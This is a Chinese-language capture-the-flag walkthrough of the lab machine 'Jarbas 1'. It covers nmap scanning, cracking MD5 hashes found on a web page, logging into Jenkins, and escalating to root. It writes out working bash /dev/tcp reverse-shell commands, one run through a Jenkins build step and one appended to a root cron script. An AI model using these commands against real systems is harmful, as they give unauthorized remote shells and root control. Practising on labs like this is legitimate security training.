# Jarbas 1

> 本机 IP: 11.11.11.11
>
> 目标 IP: 11.11.11.12
>
> 参考 [wp](https://www.bilibili.com/video/BV1jm4y1A7Tm/)

## 扫描

```sh
# 主机发现
$ nmap -sn 11.11.11.11/24
Nmap scan report for 11.11.11.12
Host is up

$ sudo nmap -p- --min-rate 10000 11.11.11.12
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
8080/tcp open  http-proxy

$ sudo nmap -sT -sV -O -p22,80,3306,8080 11.11.11.12
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
8080/tcp open  http    Jetty 9.4.z-SNAPSHOT

$ sudo nmap -sU -p22,80,3306,8080 11.11.11.12
PORT     STATE  SERVICE
22/udp   closed ssh
80/udp   closed http
3306/udp closed mysql
8080/udp closed http-alt

$ sudo nmap --script=vuln -p22,80,3306,8080 11.11.11.12
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
|_http-trace: TRACE is enabled
| http-csrf:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=11.11.11.12
|   Found the following possible CSRF vulnerabilities:
|
|     Path: http://11.11.11.12:80/
|     Form id: wmtb
|     Form action: /web/submit
|
|     Path: http://11.11.11.12:80/
|     Form id:
|     Form action: /web/20020720170457/http://jarbas.com.br:80/user.php
|
|     Path: http://11.11.11.12:80/
|     Form id:
|_    Form action: /web/20020720170457/http://jarbas.com.br:80/busca/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-sql-injection:
|   Possible sqli for queries:
|     http://11.11.11.12:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum:
|_  /icons/: Potentially interesting folder w/ directory listing
3306/tcp open  mysql
8080/tcp open  http-proxy
| http-enum:
|_  /robots.txt: Robots file
```

## web

### http://11.11.11.12:8080/

http://11.11.11.12:8080/ 登录界面

访问 http://11.11.11.12:8080/robots.txt :

```txt
# we don't want robots to click "build" links
User-agent: *
Disallow: /
```

```sh
# 扫描路径
$ sudo msfconsole

msf6 > use auxiliary/scanner/http/dir_scanner
msf6 auxiliary(scanner/http/dir_scanner) > set RHOSTS 11.11.11.12
msf6 auxiliary(scanner/http/dir_scanner) > set RPORT 8080
msf6 auxiliary(scanner/http/dir_scanner) > run

# 无果
```

### http://11.11.11.12/

```sh
$ sudo gobuster dir -u http://11.11.11.12/ -w /opt/metasploit/data/wmap/wmap_dirs.txt -x html,php
/access.html          (Status: 200) [Size: 359]
/index.html           (Status: 200) [Size: 32808]
```

访问 http://11.11.11.12/access.html :

```txt
Creds encrypted in a safe way!

tiago:5978a63b4654c73c60fa24f836386d87
trindade:f463f63616cb3f1e81ce46b39f882fd5
eder:9b38e2b1e8b12f426b0d208a7ab6cb98
```

<!-- md5爆破网站: https://hashes.com/en/decrypt/hash -->

可能为 md5:

```txt
tiago:5978a63b4654c73c60fa24f836386d87:italia99
trindade:f463f63616cb3f1e81ce46b39f882fd5:marianna
eder:9b38e2b1e8b12f426b0d208a7ab6cb98:vipsu
```

尝试登录 http://11.11.11.12:8080/, `eder:vipsu` 成功登录 Jenkins

新建项目 -> 构建 -> Execute shell -> bash -i >& /dev/tcp/11.11.11.11/23333 0>&1 -> 保持

本机: `nc -lvvp 23333`

立即构建, 反弹成功

## 内网

```sh
bash-4.2$ whoami
whoami
jenkins

bash-4.2$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:997:User for polkitd:/:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
eder:x:1000:1000:Eder Luiz:/home/eder:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
jenkins:x:997:995:Jenkins Automation Server:/var/lib/jenkins:/bin/false

bash-4.2$ cat /etc/crontab
cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
*/5 * * * * root /etc/script/CleaningScript.sh >/dev/null 2>&1

bash-4.2$ cat /etc/script/CleaningScript.sh
cat /etc/script/CleaningScript.sh
#!/bin/bash

rm -rf /var/log/httpd/access_log.txt

bash-4.2$ echo "/bin/bash -i >& /dev/tcp/11.11.11.11/24444 0>&1" >> /etc/script/CleaningScript.sh
<i >& /dev/tcp/11.11.11.11/24444 0>&1" >> /etc/script/CleaningScript.sh
```

本机开启监听 `sudo nc -lvvp 24444`, 拿到 root
